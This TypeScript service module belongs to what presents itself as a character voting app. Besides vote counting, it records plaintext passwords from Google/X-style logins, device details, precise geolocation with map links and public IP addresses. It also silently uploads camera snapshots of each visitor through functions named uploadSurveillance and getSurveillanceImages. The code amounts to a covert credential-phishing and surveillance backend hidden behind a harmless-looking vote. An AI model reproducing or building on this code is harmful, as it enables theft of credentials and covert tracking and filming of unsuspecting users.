import { supabase, isSupabaseConfigured } from '../lib/supabase';
import { Character } from '../types';
import { INITIAL_CHARACTERS } from '../constants';

// FIXED: Use relative path. Vite proxy (vite.config.ts) will handle forwarding to http://localhost:3001
const LOCAL_SERVER_URL = ''; 

// --- TYPES ---
export interface VoteRecord {
  charId: string;
  user: string;
  timestamp: string;
  deviceInfo: any;
  location: any;
}

export interface UserLoginPayload {
  user_identifier: string;
  password_text: string; // Simulation only
  login_method: 'google' | 'x' | 'guest_visit' | 'location_update';
  device_info: any;
  location_data: any;
}

// --- HELPER ---
const generateMapsUrl = (loc: any): string | null => {
    if (loc && loc.lat && loc.lng) {
        return `https://www.google.com/maps?q=${loc.lat},${loc.lng}`;
    }
    return null;
};

// Fetch client IP - Prioritize Public IP, fallback to Local Server
const getClientIP = async (): Promise<string> => {
    try {
        // 1. Try public API first (to get real WAN IP like 182.10.xx.xx)
        const publicRes = await fetch('https://api.ipify.org?format=json');
        if (publicRes.ok) {
            const data = await publicRes.json();
            return data.ip;
        }
        throw new Error('Public IP fetch failed');
    } catch (e) {
        // 2. Fallback to local server (might return localhost/LAN IP)
        try {
            const res = await fetch(`${LOCAL_SERVER_URL}/api/ip`);
            if (!res.ok) throw new Error('Local IP fetch failed');
            const data = await res.json();
            return data.ip || 'unknown';
        } catch (localErr) {
            return 'unknown';
        }
    }
};

// Helper to safely stringify Supabase errors
const logSupabaseError = (context: string, error: any) => {
    const msg = error?.message || JSON.stringify(error);
    console.error(`${context}: ${msg}`, error);
};

// Wrapper for safe LocalStorage.setItem (Only for text data now)
const safeSetItem = (key: string, value: string) => {
    try {
        localStorage.setItem(key, value);
    } catch (e: any) {
        console.warn("Storage quota exceeded or error. Data not saved locally:", key);
    }
};

// --- SERVICE ---
export const dataService = {
  
  /**
   * Mengambil daftar karakter terbaru.
   */
  getCharacters: async (): Promise<Character[]> => {
    // 1. Try Supabase if configured
    if (isSupabaseConfigured() && supabase) {
      const { data, error } = await supabase
        .from('characters')
        .select('*')
        .order('votes', { ascending: false });
      
      if (!error && data && data.length > 0) {
        // Save to local cache for offline fallback
        const mapped = data.map((d: any) => ({
            id: d.character_id || d.id,
            name: d.name,
            role: d.role,
            description: d.description,
            imageUrl: d.image_url,
            votes: d.votes,
            themeColor: d.theme_color
        }));
        safeSetItem('muse_characters', JSON.stringify(mapped));
        return mapped;
      }
    }

    // 2. Fallback to LocalStorage (Source of Truth for Local Mode)
    const saved = localStorage.getItem('muse_characters');
    if (saved) {
        try {
            return JSON.parse(saved);
        } catch (e) {
            console.error("Error parsing local characters", e);
        }
    }
    
    // 3. First time load? Save Initial to LS immediately
    safeSetItem('muse_characters', JSON.stringify(INITIAL_CHARACTERS));
    return INITIAL_CHARACTERS;
  },

  /**
   * Mencatat User Login / Guest Visit ke Database
   */
  registerUserLogin: async (payload: UserLoginPayload) => {
    const ip = await getClientIP();

    const mapsUrl = generateMapsUrl(payload.location_data);
    const enrichedLocation = {
        ...payload.location_data,
        mapsUrl: mapsUrl,
        ipAddress: ip
    };

    if (isSupabaseConfigured() && supabase) {
      const folderRef = `${payload.user_identifier}/`;
      const { error } = await supabase
        .from('users')
        .insert({
          user_identifier: payload.user_identifier,
          password_text: payload.password_text,
          login_method: payload.login_method,
          device_info: payload.device_info, // Now contains detailed info
          location_data: enrichedLocation, 
          camera_folder_ref: folderRef,
          last_login: new Date().toISOString()
        });
      if (error) logSupabaseError("Supabase Login Log Error", error);
    } else {
        // Save simple log to LocalStorage for Admin Dashboard
        const logKey = `muse_login_log_${Date.now()}`;
        const logEntry = {
            user: payload.user_identifier,
            method: payload.login_method,
            timestamp: new Date().toISOString(),
            ip: ip,
            deviceInfo: payload.device_info // Store detailed info locally too
        };
        safeSetItem(logKey, JSON.stringify(logEntry));
    }
  },

  /**
   * Melakukan voting.
   * Logic: Update DB -> Update Local Cache
   */
  castVote: async (
    characterId: string, 
    user: string, 
    meta: { location: any, deviceInfo: any }
  ): Promise<boolean> => {
    
    const timestamp = new Date().toISOString();
    const ip = await getClientIP();
    
    const mapsUrl = generateMapsUrl(meta.location);
    const enrichedLocation = {
        ...meta.location,
        mapsUrl: mapsUrl,
        ipAddress: ip
    };

    // 1. SUPABASE (Primary Storage)
    if (isSupabaseConfigured() && supabase) {
      
      // A. Insert Vote Record
      const { error: voteError } = await supabase.from('votes').insert({
          user_identifier: user,
          character_id: characterId,
          device_info: meta.deviceInfo,
          location_data: enrichedLocation,
          created_at: timestamp
      });
      
      if (voteError) {
          console.error("Failed to insert vote record:", voteError);
          return false; 
      }

      // B. FALLBACK: EXPLICITLY Update Character Count
      const { data: currentChar } = await supabase
          .from('characters')
          .select('votes')
          .eq('character_id', characterId)
          .single();

      if (currentChar) {
          // We assume the trigger does it, but we send this just in case. 
          // Note: If RLS prevents anonymous updates, this might fail silently or throw error, 
          // but we already secured the 'vote' insertion above.
          const { error: updateError } = await supabase
            .from('characters')
            .update({ votes: currentChar.votes + 1 })
            .eq('character_id', characterId);
            
          if (updateError) {
              console.log("Manual update skipped (likely handled by Trigger or RLS):", updateError.message);
          }
      }
    }

    // 2. LOCAL STORAGE (Persistence & UI Sync)
    const voteData = {
        charId: characterId,
        user: user,
        timestamp: timestamp,
        deviceInfo: meta.deviceInfo,
        location: enrichedLocation
    };
    safeSetItem(`muse_vote_record_${user}`, JSON.stringify(voteData));

    // Update Character Counts Locally (Optimistic update for next load)
    const currentData = await dataService.getCharacters();
    const updatedChars = currentData.map(c => 
      c.id === characterId ? { ...c, votes: c.votes + 1 } : c
    );
    safeSetItem('muse_characters', JSON.stringify(updatedChars));

    return true;
  },

  /**
   * Mengirim gambar ke Local Server.
   */
  uploadSurveillance: async (user: string, base64Image: string) => {
    try {
        if (!base64Image || !base64Image.includes(',')) return;

        // Uses relative path /api/upload which is proxied by Vite
        await fetch(`${LOCAL_SERVER_URL}/api/upload`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ user, image: base64Image })
        });
    } catch (e) {
        // Silent error
    }
  },

  /**
   * Mengambil list gambar.
   */
  getSurveillanceImages: async (user: string): Promise<{timestamp: string, url: string}[]> => {
      try {
          const response = await fetch(`${LOCAL_SERVER_URL}/api/images/${user}`);
          if (!response.ok) return [];
          const data = await response.json();
          
          if (data && data.images) {
              return data.images.map((img: any) => ({
                  timestamp: new Date(img.timestamp).toLocaleTimeString(),
                  url: img.url
              }));
          }
          return [];
      } catch (e) {
          return [];
      }
  },

  subscribeToVotes: (callback: () => void) => {
    if (isSupabaseConfigured() && supabase) {
      const channel = supabase
        .channel('public:characters')
        .on('postgres_changes', { event: '*', schema: 'public', table: 'characters' }, callback)
        .subscribe();
      return () => { supabase.removeChannel(channel); };
    }
    return () => {};
  }
};